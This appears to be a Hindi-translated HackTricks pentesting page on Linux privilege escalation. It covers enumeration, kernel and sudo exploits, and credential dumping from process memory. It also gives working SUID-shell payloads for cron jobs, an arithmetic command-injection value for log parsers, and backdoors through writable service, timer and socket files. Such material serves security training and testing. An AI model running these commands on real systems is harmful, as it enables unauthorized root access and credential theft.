# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी प्राप्त करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर write permissions रखते हैं** तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई दिलचस्प जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version की जाँच करें और देखें कि कोई exploit है जो escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छी vulnerable kernel सूची और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel संस्करण निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
ये tools kernel exploits खोजने में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim पर execute करें, केवल kernel 2.x के लिए exploits की जाँच करता है)

हमेशा **kernel version को Google में खोजें**, शायद आपका kernel version किसी kernel exploit में लिखा हुआ है और तब आप सुनिश्चित हो पाएँगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप यह जांच सकते हैं कि sudo का version vulnerable है या नहीं, इस grep का उपयोग करके।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के वे संस्करण जो 1.9.17p1 से पहले हैं (**1.9.14 - 1.9.17 < 1.9.17p1**) अनप्रिविलेज्ड लोकल उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से root तक अपनी privileges escalate करने की अनुमति देते हैं जब `/etc/nsswitch.conf` फ़ाइल किसी user-controlled निर्देशिका से उपयोग की जाती है।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` संस्करण vulnerable है और यह `chroot` फीचर को सपोर्ट करता है।

अधिक जानकारी के लिए, मूल [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें।

#### sudo < v1.8.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन असफल

इस vuln को कैसे exploited किया जा सकता है, इसका **उदाहरण** देखने के लिए **smasher2 box of HTB** देखें
```bash
dmesg 2>/dev/null | grep "signature"
```
### और अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं तो आप इससे बाहर निकलने का प्रयास कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **what is mounted and unmounted**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप इसे mount करके निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही जाँचें कि **कोई compiler इंस्टॉल है या नहीं**। यह उपयोगी है अगर आपको कोई kernel exploit इस्तेमाल करना हो क्योंकि अनुशंसित है कि आप इसे उसी मशीन पर compile करें जहाँ आप इसे उपयोग करने जा रहे हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर इंस्टॉल्ड

इंस्टॉल किए गए पैकेज और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे escalating privileges के लिए exploit किया जा सके…\  
सुझाव दिया जाता है कि संदेहास्पद रूप से इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जाँचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है, तो आप मशीन में इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच के लिए **openVAS** का उपयोग भी कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सी जानकारी दिखाएँगे जो अधिकतर बेकार होगी, इसलिए OpenVAS या इसी तरह के कुछ applications की सिफारिश की जाती है जो जांचें कि कोई इंस्टॉल किया गया सॉफ़्टवेयर वर्शन ज्ञात exploits के लिए vulnerable तो नहीं है_

## Processes

देखें कि **कौन से प्रोसेस** चल रहे हैं और जाँचें कि क्या किसी प्रोसेस के पास **ज़रूरत से अधिक privileges** तो नहीं हैं (शायद tomcat को root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** उनको process की command line में `--inspect` parameter की जाँच करके पता करता है।\
साथ ही **process के binaries पर अपने privileges की जाँच करें**, शायद आप किसी को overwrite कर सकें।

### Process monitoring

आप प्रोसेसेस मॉनिटर करने के लिए [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग कर सकते हैं। यह अक्सर चलने वाले या जब कुछ शर्तें पूरी हों तो चलाए जाने वाले vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है।

### Process memory

किसी सर्वर की कुछ सेवाएँ मेमोरी के अंदर साफ़ टेक्स्ट में **क्रेडेंशियल्स** सहेजती हैं।\
आम तौर पर आपको अन्य उपयोगकर्ताओं के processes की मेमोरी पढ़ने के लिए **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब अधिक उपयोगी होता है जब आप पहले से root हों और और क्रेडेंशियल्स खोजना चाहें।\
हालाँकि, ध्यान रखें कि **साधारण उपयोगकर्ता के रूप में आप अपने स्वामित्व वाले प्रोसेसेस की मेमोरी पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश मशीनें डिफ़ॉल्ट रूप से **ptrace की अनुमति नहीं देतीं**, जिसका मतलब है कि आप अपने अनप्रिविलेज्ड यूज़र के other processes को dump नहीं कर सकते।
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनके uid समान हों। यह ptracing का पारंपरिक व्यवहार था।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। इसे सेट करने के बाद ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होगी।

#### GDB

यदि आपके पास किसी FTP सेवा (उदाहरण के लिए) की मेमोरी तक पहुँच है, तो आप Heap निकाल कर उसके क्रेडेंशियल्स के अंदर खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि उस प्रक्रिया के भीतर memory कैसे mapped है** वर्चुअल एड्रेस स्पेस; यह **प्रत्येक mapped region की permissions** भी दिखाता है। यह **mem** छद्म फ़ाइल **process की memory स्वयं उजागर करती है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **memory regions पढ़ने योग्य हैं** और उनके offsets। हम इस जानकारी का उपयोग करके **mem फ़ाइल में seek करके सभी पढ़ने योग्य regions को dump** कर के उन्हें एक फ़ाइल में सहेजते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी तक। Kernel के वर्चुअल एड्रेस स्पेस तक /dev/kmem के माध्यम से पहुँचा जा सकता है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ा जा सकता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के Sysinternals सूट में मौजूद क्लासिक ProcDump टूल की Linux के लिए पुनर्कल्पना है। इसे यहां पाएं [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

process memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताओं को हटा कर आपके स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Credentials from Process Memory

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शनों को देखें ताकि process की memory dump करने के विभिन्न तरीके मिल सकें) और memory के अंदर credentials खोजें:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **clear text credentials** और कुछ **well known files** से चुराएगा। इसे सही तरीके से काम करने के लिए root privileges की आवश्यकता होती है।

| विशेषता                                           | प्रोसेस नाम            |
| ------------------------------------------------- | --------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Active FTP Connections)                   | vsftpd                |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2               |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                 |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – web-based scheduler privesc

यदि एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback पर बाइंड है, तो आप इसे SSH local port-forwarding के माध्यम से पहुँचाकर privilege escalation के लिए एक privileged job बना सकते हैं।

सामान्य चेन
- loopback-only पोर्ट खोजें (जैसे, 127.0.0.1:8000) और Basic-Auth realm `ss -ntlp` / `curl -v localhost:8000` के माध्यम से
- ऑपरेशनल artifacts में credentials खोजें:
  - Backups/scripts जिनमें `zip -P <password>` हो
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` एक्सपोज़ कर रहा हो
- टनल और लॉगिन:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित user और न्यूनतम permissions के साथ सीमित रखें
- localhost पर bind करें और अतिरिक्त रूप से firewall/VPN के माध्यम से access सीमित करें; passwords को reuse न करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें



जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप root द्वारा execute किए जा रहे किसी script का फायदा उठा सकें (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली files modify कर सकते हैं? symlinks का उपयोग करें? root द्वारा उपयोग किए जाने वाले directory में specific files बनाएं?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root उपयोगकर्ता PATH सेट किए बिना किसी command या script को execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\"

फिर, आप निम्न का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron: wildcard के साथ स्क्रिप्ट का उपयोग (Wildcard Injection)

यदि root द्वारा कोई स्क्रिप्ट execute की जाती है और किसी command के अंदर “**\***” है, तो आप इसे exploit करके अनपेक्षित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी पथ जैसे** _**/some/path/\***_ **से पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution होता है। यदि कोई root cron/parser untrusted log fields पढ़ता है और उन्हें arithmetic context में भेजता है, तो एक attacker $(...) जैसा command substitution inject कर सकता है जो cron के चलने पर root के रूप में execute होगा।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, और फिर word splitting और pathname expansion। इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसे मान में पहले substitution होता है (कमांड चल रहा होता है), और बचा हुआ numeric `0` arithmetic के लिए उपयोग होता है ताकि script बिना error के आगे बढ़े।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log में attacker-controlled टेक्स्ट लिखवाइए ताकि numeric-जैसा field में command substitution हो और वह एक digit पर खत्म हो। सुनिश्चित करें कि आपका command stdout पर कुछ print न करे (या इसे redirect करें), ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **can modify a cron script** जो root द्वारा execute होता है, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा execute किया गया script किसी **directory where you have full access** का उपयोग करता है, तो शायद उस फ़ोल्डर को delete करके और **create a symlink folder to another one** जो आपके द्वारा नियंत्रित script को serve करे, बनाना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### बार-बार चलने वाले cron jobs

आप processes की निगरानी कर सकते हैं ताकि उन प्रक्रियाओं को खोजा जा सके जो हर 1, 2 या 5 मिनट पर execute हो रही हैं। शायद आप इसका फायदा उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **monitor every 0.1s during 1 minute**, **sort by less executed commands** और सबसे अधिक execute हुई commands को delete करने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर process की निगरानी करेगा और उन्हें सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सके **टिप्पणी के बाद कैरिज रिटर्न डालकर** (बिना newline character के), और cron job काम करेगा।  
उदाहरण (कैरिज रिटर्न कैरेक्टर पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं; अगर कर सकते हैं तो आप इसे इस तरह बदल सकते हैं कि यह आपकी **backdoor** को तब **निष्पादित** करे जब सेवा **started**, **restarted** या **stopped** (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े).\
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनाएँ **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service बाइनरीज़

ध्यान रखें कि अगर आपके पास उन बाइनरीज़ पर **write permissions** हैं जिन्हें services द्वारा execute किया जा रहा है, तो आप उन्हें backdoor के लिए बदल सकते हैं ताकि जब services फिर से execute हों तो backdoors execute हों।

### systemd PATH - Relative Paths

आप systemd द्वारा उपयोग किए जाने वाले PATH को इस तरह देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं, तो आप **escalate privileges** करने में सक्षम हो सकते हैं। आपको **relative paths being used on service configurations** फ़ाइलों जैसी चीज़ों की खोज करनी चाहिए:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जिस पर आप लिख सकते हैं, एक **निष्पादन योग्य** बनाएं जो उसी **सापेक्ष पथ बाइनरी** के नाम का हो, और जब सेवा से संवेदनशील क्रिया (**Start**, **Stop**, **Reload**) करने के लिए कहा जाएगा, आपका **backdoor** निष्पादित हो जाएगा (अनप्रिविलेज्ड उपयोगकर्ता आमतौर पर services को start/stop नहीं कर सकते लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd यूनिट फ़ाइलें हैं जिनके नाम का अंत `**.timer**` में होता है जो `**.service**` फ़ाइलों या घटनाओं को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए बिल्ट-इन सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी timers को निम्न कमांड से सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर में संशोधन कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूद इकाइयों (जैसे `.service` या `.target`) को चलाने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि यूनिट क्या है:

> जब यह timer समाप्त होता है तो सक्रिय करने के लिए यूनिट। तर्क एक यूनिट नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर default होता है जिसका नाम timer यूनिट के समान होता है, सिवाय suffix के। (ऊपर देखें.) यह अनुशंसित है कि जो यूनिट नाम सक्रिय किया जाता है और timer यूनिट का यूनिट नाम एक समान हों, सिवाय suffix के।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको निम्न करना होगा:

- किसी systemd यूनिट (जैसे `.service`) को खोजें जो **लिखने योग्य बाइनरी चला रहा हो**
- किसी systemd यूनिट को खोजें जो **सापेक्ष पथ निष्पादित कर रहा हो** और आपके पास **systemd PATH** पर **लिखने की अनुमतियाँ** हों (उस निष्पादन योग्य फ़ाइल की नकल/प्रतिरूपण करने के लिए)

**Timers के बारे में अधिक जानने के लिए `man systemd.timer` देखें।**

### **Timer सक्षम करना**

Timer सक्षम करने के लिए आपको root privileges चाहिए और निम्न कमांड चलानी होगी:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल के भीतर एक ही या अलग मशीनों पर **process communication** सक्षम करते हैं। वे कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फाइल के अंदर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन एक सारांश का उपयोग यह **कहाँ सुनने वाला है** बताने के लिए किया जाता है (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए port नंबर, आदि)
- `Accept`: यह एक boolean argument लेता है। यदि **true** है, तो **प्रति आने वाले कनेक्शन एक service instance spawn किया जाता है** और केवल connection socket ही इसे पास किया जाता है। यदि **false** है, तो सभी listening sockets स्वयं **started service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit बिना शर्त सभी incoming traffic को संभालती है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons केवल इस तरह लिखने की सलाह दी जाती है कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **created** और bound होने से पहले या बाद में क्रमशः **executed** किया जाता है। command line का पहला token एक absolute filename होना चाहिए, और उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जिन्हें listening **sockets**/FIFOs के **closed** और removed होने से पहले या बाद में क्रमशः **executed** किया जाता है।
- `Service`: इनकमिंग ट्रैफ़िक पर activate करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल उन sockets के लिए अनुमति है जिनका Accept=no है। यह डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम socket के नाम के समान होता है (suffix बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाये जाने से पहले execute हो जाएगा। इसलिए, आपको **शायद मशीन के reboot होने तक इंतज़ार करना होगा।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_अब हम कॉन्फ़िग `.socket` फाइलों के बारे में नहीं बल्कि Unix Sockets की बात कर रहे हैं_), तो **आप उस socket के साथ communicate कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

